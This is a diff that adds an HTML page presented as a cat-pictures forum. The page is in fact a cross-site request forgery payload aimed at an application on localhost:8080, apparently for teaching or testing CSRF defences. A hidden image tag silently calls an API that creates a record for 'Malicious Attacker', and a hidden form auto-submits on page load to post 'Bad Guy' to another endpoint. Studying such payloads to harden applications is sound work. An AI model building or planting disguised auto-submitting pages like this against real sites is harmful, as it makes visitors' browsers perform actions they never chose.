@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cat Pictures Forum</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <h1>A forum of Cat pictures</h1>
+
+    <h2>My nice cat</h2>
+    <p><img title="A Nice Cat" alt="A Nice Cat" src="images/cat1.jpg" width="400" height="200"></p>
+    <h2>My other nice cat</h2>
+    <p><img title="Another Nice Cat" src="images/cat2.jpg" width="400" height="200"></p>
+    <p><img title="Another Nice Cat" src="http://localhost:8080/api/create?firstname=Malicious&lastname=Attacker" width="400" height="200" hidden></p>
+
+    <form action="http://localhost:8080/web" method="post">
+        <input type="hidden" name="firstName" value="Bad">
+        <input type="hidden" name="lastName" value="Guy">
+    </form>
+
+</body>
+</html>
